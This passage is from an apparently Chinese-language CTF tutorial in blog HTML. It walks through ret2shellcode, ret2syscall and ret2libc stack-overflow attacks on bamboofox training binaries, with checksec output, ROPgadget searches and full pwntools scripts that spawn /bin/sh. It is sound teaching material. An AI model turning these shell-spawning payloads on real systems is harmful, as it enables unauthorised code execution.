class=\"hljs-number\">0</span>x0804b000 <span class=\"hljs-number\">0</span>x00001000 rwx <span class=\"hljs-regexp\">/mnt/</span>hgfs<span class=\"hljs-regexp\">/Hack/</span>CTF-Learn<span class=\"hljs-regexp\">/pwn/</span>stack<span class=\"hljs-regexp\">/example/</span>ret2shellcode/ret2shellcode<br></code></pre></td></tr></tbody></table></figure>\n\n<p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p>\n<p>具体的 payload 如下</p>\n<figure class=\"highlight mipsasm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mipsasm\"><span class=\"hljs-comment\">#!/usr/bin/env python</span><br>from pwn import *<br><br><span class=\"hljs-keyword\">sh </span>= process(<span class=\"hljs-string\">'./ret2shellcode'</span>)<br><span class=\"hljs-keyword\">shellcode </span>= asm(<span class=\"hljs-keyword\">shellcraft.sh())</span><br><span class=\"hljs-keyword\"></span><span class=\"hljs-keyword\">buf2_addr </span>= <span class=\"hljs-number\">0x804a080</span><br><br><span class=\"hljs-keyword\">sh.sendline(shellcode.ljust(112, </span><span class=\"hljs-string\">'A'</span>) + p32(<span class=\"hljs-keyword\">buf2_addr))</span><br><span class=\"hljs-keyword\"></span><span class=\"hljs-keyword\">sh.interactive()</span><br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"题目-¶\"><a href=\"#题目-¶\" class=\"headerlink\" title=\"题目 ¶\"></a>题目 <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_5\">¶</a></h3><ul>\n<li>sniperoj-pwn100-shellcode-x86-64</li>\n</ul>\n<h2 id=\"ret2syscall¶\"><a href=\"#ret2syscall¶\" class=\"headerlink\" title=\"ret2syscall¶\"></a>ret2syscall<a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall\">¶</a></h2><h3 id=\"原理-¶-2\"><a href=\"#原理-¶-2\" class=\"headerlink\" title=\"原理 ¶\"></a>原理 <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_6\">¶</a></h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>\n<h3 id=\"例子-¶-2\"><a href=\"#例子-¶-2\" class=\"headerlink\" title=\"例子 ¶\"></a>例子 <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_7\">¶</a></h3><p>这里我们以 bamboofox 中的 ret2syscall 为例</p>\n<p>点击下载: <a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop\">ret2syscall</a></p>\n<p>首先检测程序开启的保护</p>\n<figure class=\"highlight yaml\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-string\">➜</span>  <span class=\"hljs-string\">ret2syscall</span> <span class=\"hljs-string\">checksec</span> <span class=\"hljs-string\">rop</span><br>    <span class=\"hljs-attr\">Arch:</span>     <span class=\"hljs-string\">i386-32-little</span><br>    <span class=\"hljs-attr\">RELRO:</span>    <span class=\"hljs-string\">Partial</span> <span class=\"hljs-string\">RELRO</span><br>    <span class=\"hljs-attr\">Stack:</span>    <span class=\"hljs-literal\">No</span> <span class=\"hljs-string\">canary</span> <span class=\"hljs-string\">found</span><br>    <span class=\"hljs-attr\">NX:</span>       <span class=\"hljs-string\">NX</span> <span class=\"hljs-string\">enabled</span><br>    <span class=\"hljs-attr\">PIE:</span>      <span class=\"hljs-literal\">No</span> <span class=\"hljs-string\">PIE</span> <span class=\"hljs-string\">(0x8048000)</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p>\n<figure class=\"highlight cpp\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs cpp\"><span class=\"hljs-function\"><span class=\"hljs-type\">int</span> __cdecl <span class=\"hljs-title\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> argc, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> **argv, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> **envp)</span></span><br><span class=\"hljs-function\"></span>{<br>  <span class=\"hljs-type\">int</span> v4; <span class=\"hljs-comment\">// [sp+1Ch] [bp-64h]@1</span><br><br>  <span class=\"hljs-built_in\">setvbuf</span>(stdout, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">0</span>);<br>  <span class=\"hljs-built_in\">setvbuf</span>(stdin, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>);<br>  <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">\"This time, no system() and NO SHELLCODE!!!\"</span>);<br>  <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">\"What do you plan to do?\"</span>);<br>  <span class=\"hljs-built_in\">gets</span>(&amp;v4);<br>  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p>\n<ul>\n<li><a href=\"https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8\">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li>\n</ul>\n<p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p>\n<figure class=\"highlight stylus\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-function\"><span class=\"hljs-title\">execve</span><span class=\"hljs-params\">(<span class=\"hljs-string\">\"/bin/sh\"</span>,NULL,NULL)</span></span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>其中，该程序是 32 位，所以我们需要使得</p>\n<ul>\n<li>系统调用号，即 eax 应该为 0xb</li>\n<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>\n<li>第二个参数，即 ecx 应该为 0</li>\n<li>第三个参数，即 edx 应该为 0</li>\n</ul>\n<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>\n<p>首先，我们来寻找控制 eax 的 gadgets</p>\n<figure class=\"highlight x86asm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs x86asm\">➜  ret2syscall ROPgadget --binary rop  --only <span class=\"hljs-string\">'pop|ret'</span> | grep <span class=\"hljs-string\">'eax'</span><br><span class=\"hljs-number\">0x0809ddda</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">eax</span> <span class=\"hljs-comment\">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"hljs-number\">0x080bb196</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">eax</span> <span class=\"hljs-comment\">; ret</span><br><span class=\"hljs-number\">0x0807217a</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">eax</span> <span class=\"hljs-comment\">; ret 0x80e</span><br><span class=\"hljs-number\">0x0804f704</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">eax</span> <span class=\"hljs-comment\">; ret 3</span><br><span class=\"hljs-number\">0x0809ddd9</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">es</span> <span class=\"hljs-comment\">; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p>\n<p>类似的，我们可以得到控制其它寄存器的 gadgets</p>\n<figure class=\"highlight x86asm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs x86asm\">➜  ret2syscall ROPgadget --binary rop  --only <span class=\"hljs-string\">'pop|ret'</span> | grep <span class=\"hljs-string\">'ebx'</span><br><span class=\"hljs-number\">0x0809dde2</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ds</span> <span class=\"hljs-comment\">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"hljs-number\">0x0809ddda</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">eax</span> <span class=\"hljs-comment\">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"hljs-number\">0x0805b6ed</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebp</span> <span class=\"hljs-comment\">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"hljs-number\">0x0809e1d4</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop ebp ; pop esi ; pop edi ; ret</span><br><span class=\"hljs-number\">0x080be23f</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop edi ; ret</span><br><span class=\"hljs-number\">0x0806eb69</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop edx ; ret</span><br><span class=\"hljs-number\">0x08092258</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop esi ; pop ebp ; ret</span><br><span class=\"hljs-number\">0x0804838b</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"hljs-number\">0x080a9a42</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class=\"hljs-number\">0x08096a26</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class=\"hljs-number\">0x08070d73</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class=\"hljs-number\">0x0805ae81</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class=\"hljs-number\">0x08049bfd</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class=\"hljs-number\">0x08048913</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop esi ; pop edi ; ret</span><br><span class=\"hljs-number\">0x08049a19</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop esi ; pop edi ; ret 4</span><br><span class=\"hljs-number\">0x08049a94</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; pop esi ; ret</span><br><span class=\"hljs-number\">0x080481c9</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; ret</span><br><span class=\"hljs-number\">0x080d7d3c</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; ret 0x6f9</span><br><span class=\"hljs-number\">0x08099c87</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-comment\">; ret 8</span><br><span class=\"hljs-number\">0x0806eb91</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ecx</span> <span class=\"hljs-comment\">; pop ebx ; ret</span><br><span class=\"hljs-number\">0x0806336b</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">edi</span> <span class=\"hljs-comment\">; pop esi ; pop ebx ; ret</span><br><span class=\"hljs-number\">0x0806eb90</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">edx</span> <span class=\"hljs-comment\">; pop ecx ; pop ebx ; ret</span><br><span class=\"hljs-number\">0x0809ddd9</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">es</span> <span class=\"hljs-comment\">; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"hljs-number\">0x0806eb68</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">esi</span> <span class=\"hljs-comment\">; pop ebx ; pop edx ; ret</span><br><span class=\"hljs-number\">0x0805c820</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">esi</span> <span class=\"hljs-comment\">; pop ebx ; ret</span><br><span class=\"hljs-number\">0x08050256</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">esp</span> <span class=\"hljs-comment\">; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"hljs-number\">0x0807b6ed</span> : <span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">ss</span> <span class=\"hljs-comment\">; pop ebx ; ret</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>这里，我选择</p>\n<figure class=\"highlight arcade\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs arcade\"><span class=\"hljs-number\">0x0806eb90</span> : <span class=\"hljs-built_in\">pop</span> edx ; <span class=\"hljs-built_in\">pop</span> ecx ; <span class=\"hljs-built_in\">pop</span> ebx ; ret<br></code></pre></td></tr></tbody></table></figure>\n\n<p>这个可以直接控制其它三个寄存器。</p>\n<p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p>\n<figure class=\"highlight asciidoc\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\">➜  ret2syscall ROPgadget --binary rop  --string <span class=\"hljs-emphasis\">'/bin/sh'</span> <br><span class=\"hljs-section\">Strings information</span><br><span class=\"hljs-section\">============================================================</span><br>0x080be408 : /bin/sh<br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p>\n<figure class=\"highlight asciidoc\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\">➜  ret2syscall ROPgadget --binary rop  --only <span class=\"hljs-emphasis\">'int'</span>                 <br><span class=\"hljs-section\">Gadgets information</span><br><span class=\"hljs-section\">============================================================</span><br>0x08049421 : int 0x80<br>0x080938fe : int 0xbb<br>0x080869b5 : int 0xf6<br>0x0807b4d4 : int 0xfc<br><br>Unique gadgets found: 4<br></code></pre></td></tr></tbody></table></figure>\n\n<p>同时，也找到对应的地址了。</p>\n<p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>\n<figure class=\"highlight makefile\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs makefile\"><span class=\"hljs-comment\">#!/usr/bin/env python</span><br>from pwn import *<br><br>sh = process('./rop')<br><br>pop_eax_ret = 0x080bb196<br>pop_edx_ecx_ebx_ret = 0x0806eb90<br>int_0x80 = 0x08049421<br>binsh = 0x80be408<br>payload = flat(<br>    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"题目-¶-1\"><a href=\"#题目-¶-1\" class=\"headerlink\" title=\"题目 ¶\"></a>题目 <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_8\">¶</a></h3><h2 id=\"ret2libc¶\"><a href=\"#ret2libc¶\" class=\"headerlink\" title=\"ret2libc¶\"></a>ret2libc<a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc\">¶</a></h2><h3 id=\"原理-¶-3\"><a href=\"#原理-¶-3\" class=\"headerlink\" title=\"原理 ¶\"></a>原理 <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_9\">¶</a></h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>\n<h3 id=\"例子-¶-3\"><a href=\"#例子-¶-3\" class=\"headerlink\" title=\"例子 ¶\"></a>例子 <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_10\">¶</a></h3><p>我们由简单到难分别给出三个例子。</p>\n<h4 id=\"例-1¶\"><a href=\"#例-1¶\" class=\"headerlink\" title=\"例 1¶\"></a>例 1<a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1\">¶</a></h4><p>这里我们以 bamboofox 中 ret2libc1 为例</p>\n<p>点击下载: <a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1\">ret2libc1</a></p>\n<p>首先，我们可以检查一下程序的安全保护</p>\n<figure class=\"highlight yaml\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-string\">➜</span>  <span class=\"hljs-string\">ret2libc1</span> <span class=\"hljs-string\">checksec</span> <span class=\"hljs-string\">ret2libc1</span>    <br>    <span class=\"hljs-attr\">Arch:</span>     <span class=\"hljs-string\">i386-32-little</span><br>    <span class=\"hljs-attr\">RELRO:</span>    <span class=\"hljs-string\">Partial</span> <span class=\"hljs-string\">RELRO</span><br>    <span class=\"hljs-attr\">Stack:</span>    <span class=\"hljs-literal\">No</span> <span class=\"hljs-string\">canary</span> <span class=\"hljs-string\">found</span><br>    <span class=\"hljs-attr\">NX:</span>       <span class=\"hljs-string\">NX</span> <span class=\"hljs-string\">enabled</span><br>    <span class=\"hljs-attr\">PIE:</span>      <span class=\"hljs-literal\">No</span> <span class=\"hljs-string\">PIE</span> <span class=\"hljs-string\">(0x8048000)</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p>\n<figure class=\"highlight cpp\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs cpp\"><span class=\"hljs-function\"><span class=\"hljs-type\">int</span> __cdecl <span class=\"hljs-title\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> argc, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> **argv, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> **envp)</span></span><br><span class=\"hljs-function\"></span>{<br>  <span class=\"hljs-type\">int</span> v4; <span class=\"hljs-comment\">// [sp+1Ch] [bp-64h]@1</span><br><br>  <span class=\"hljs-built_in\">setvbuf</span>(stdout, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">0</span>);<br>  <span class=\"hljs-built_in\">setvbuf</span>(_bss_start, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>);<br>  <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">\"RET2LIBC &gt;_&lt;\"</span>);<br>  <span class=\"hljs-built_in\">gets</span>((<span class=\"hljs-type\">char</span> *)&amp;v4);<br>  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p>\n<figure class=\"highlight asciidoc\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\">➜  ret2libc1 ROPgadget --binary ret2libc1 --string <span class=\"hljs-emphasis\">'/bin/sh'</span>          <br><span class=\"hljs-section\">Strings information</span><br><span class=\"hljs-section\">============================================================</span><br>0x08048720 : /bin/sh<br></code></pre></td></tr></tbody></table></figure>\n\n<p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p>\n<figure class=\"highlight ada\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ada\">.plt:<span class=\"hljs-number\">08048460</span> ; [<span class=\"hljs-number\">00000006</span> BYTES: COLLAPSED <span class=\"hljs-keyword\">FUNCTION</span> <span class=\"hljs-title\">_system.</span> PRESS CTRL-NUMPAD+ TO EXPAND]<br></code></pre></td></tr></tbody></table></figure>\n\n<p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下</p>\n<figure class=\"highlight gradle\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\">#!<span class=\"hljs-regexp\">/usr/</span>bin/env python<br><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><br>sh = process(<span class=\"hljs-string\">'./ret2libc1'</span>)<br><br>binsh_addr = <span class=\"hljs-number\">0</span>x8048720<br>system_plt = <span class=\"hljs-number\">0</span>x08048460<br>payload = flat([<span class=\"hljs-string\">'a'</span> * <span class=\"hljs-number\">112</span>, system_plt, <span class=\"hljs-string\">'b'</span> * <span class=\"hljs-number\">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure>\n\n<p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>\n<p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p>\n<h4 id=\"例-2¶\"><a href=\"#例-2¶\" class=\"headerlink\" title=\"例 2¶\"></a>例 2<a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#2\">¶</a></h4><p>这里以 bamboofox 中的 ret2libc2 为例</p>\n<p>点击下载: <a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2\">ret2libc2</a></p>\n<p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下</p>\n<figure class=\"highlight vim\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\">##!/usr/bin/env <span class=\"hljs-keyword\">python</span><br>from pwn import *<br><br><span class=\"hljs-keyword\">sh</span> = process(<span class=\"hljs-string\">'./ret2libc2'</span>)<br><br>gets_plt = <span class=\"hljs-number\">0</span>x08048460<br>system_plt = <span class=\"hljs-number\">0</span>x08048490<br>pop_ebx = <span class=\"hljs-number\">0</span>x0804843d<br>buf2 = <span class=\"hljs-number\">0</span>x804a080<br>payload = flat(<br>    [<span class=\"hljs-string\">'a'</span> * <span class=\"hljs-number\">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class=\"hljs-number\">0</span>xdeadbeef, buf2])<br><span class=\"hljs-keyword\">sh</span>.sendline(payload)<br><span class=\"hljs-keyword\">sh</span>.sendline(<span class=\"hljs-string\">'/bin/sh'</span>)<br><span class=\"hljs-keyword\">sh</span>.interactive()<br></code></pre></td></tr></tbody></table></figure>\n\n<p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p>\n<h4 id=\"例-3¶\"><a href=\"#例-3¶\" class=\"headerlink\" title=\"例 3¶\"></a>例 3<a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3\">¶</a></h4><p>这里以 bamboofox 中的 ret2libc3 为例</p>\n<p>点击下载: <a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3\">ret2libc3</a></p>\n<p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护</p>\n<figure class=\"highlight yaml\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-string\">➜</span>  <span class=\"hljs-string\">ret2libc3</span> <span class=\"hljs-string\">checksec</span> <span class=\"hljs-string\">ret2libc3</span><br>    <span 